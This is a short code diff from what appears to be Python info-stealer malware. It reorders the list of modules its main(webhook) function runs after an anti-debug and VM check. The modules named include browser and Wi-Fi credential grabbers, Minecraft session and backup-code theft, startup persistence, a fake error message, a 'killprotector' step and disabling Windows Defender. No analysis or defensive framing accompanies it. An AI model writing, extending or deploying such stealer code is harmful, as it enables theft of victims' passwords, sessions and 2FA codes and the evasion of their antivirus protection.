@@ -58,7 +58,7 @@ def main(webhook: str):
     if __CONFIG__["antidebug_vm"]:
         Debug()
 
-    threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, fakeerror, Startup, disable_defender]
+    threads = [Browsers, Wifi, Minecraft, BackupCodes, Startup, killprotector, fakeerror, disable_defender]
     configcheck(threads)
 
     for func in threads:
